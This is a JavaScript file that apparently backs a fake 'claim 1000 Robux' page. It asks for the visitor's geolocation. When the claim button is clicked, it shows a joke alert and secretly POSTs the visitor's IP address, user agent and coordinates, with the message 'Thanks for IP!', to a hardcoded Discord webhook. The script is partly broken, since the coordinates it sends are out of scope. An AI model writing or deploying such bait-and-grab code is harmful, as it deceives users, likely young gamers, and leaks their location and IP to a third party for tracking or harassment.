// Get user coords

if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
} else {
  console.log("Geolocation is not supported by this browser.");
  // Provide a fallback or inform the user
}

function successCallback(position) {
  // Permission granted and location retrieved
  const latitude = position.coords.latitude;
  const longitude = position.coords.longitude;
  console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
  // Use the location data here
}

function errorCallback(error) {
  // Handle errors or permission denial
  switch (error.code) {
    case error.PERMISSION_DENIED:
      console.log("User denied the request for Geolocation.");
      // Inform the user or provide an alternative
      break;
    case error.POSITION_UNAVAILABLE:
      console.log("Location information is unavailable.");
      break;
    case error.TIMEOUT:
      console.log("The request to get user location timed out.");
      break;
    case error.UNKNOWN_ERROR:
      console.log("An unknown error occurred.");
      break;
  }
}

function getIP(json) {
    console.log("IP Address: " + json.ip);
    const claimButton = document.getElementById('claimButton');
    claimButton.addEventListener('click', function() {
        alert("Congratulations! You have claimed 1000 Robux! (This is just a joke, no real Robux here!)");
        fetch("https://discord.com/api/webhooks/1391784250684211200/G8BjbeLjWfbVymAubxkOBjgm-oM7TlfMAPKIW6ssiG9gBR-0gyqZMx8swXnAXSWc1vyw", {
            body: JSON.stringify({
                content: `IP:` + json.ip + `\nUser Agent: ` + navigator.userAgent + `\n Thanks for IP!\n Latitude: ` + position.coords.latitude + `\n Longitude: ` + position.coords.longitude,
            }),
            headers: {
                "Content-Type": "application/json",
            },
            method: "POST",
        })
            .then(function (res) {
                console.log(res);
            })
            .catch(function (res) {
                console.log(res);
            });
    });
}